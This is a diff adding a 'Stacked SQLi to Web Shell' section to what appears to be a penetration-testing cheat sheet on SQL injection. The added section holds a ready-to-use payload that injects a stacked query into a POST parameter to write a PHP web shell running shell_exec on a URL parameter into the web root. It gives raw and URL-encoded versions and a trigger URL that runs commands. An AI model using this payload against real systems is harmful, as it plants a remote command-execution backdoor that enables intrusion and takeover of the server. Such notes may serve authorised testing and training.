@@ -322,6 +322,27 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.
 
 Then access: `http://target/shell.php?0=id`
 
+### Stacked SQLi to Web Shell
+Stacked queries are blind. Thus you have no ability to really get the database credentils. Try to write a webshell to the server.
+
+If a blind SQLi confirms stacked queries with `SLEEP()` and the database user can write files, try `INTO OUTFILE` even when data extraction is awkward. Example pattern from a POST body parameter:
+
+```sql
+view=request&request=log&task=query&limit=100;SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/s.php';#&minTime=1466674406.084434
+```
+
+URL-encoded:
+
+```http
+view=request&request=log&task=query&limit=100;SELECT%20%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fs.php%27%3B#&minTime=1466674406.084434
+```
+
+Then trigger:
+
+```text
+http://TARGET:PORT/s.php?c=id
+```
+
 ---
 
 ## Web Root Paths
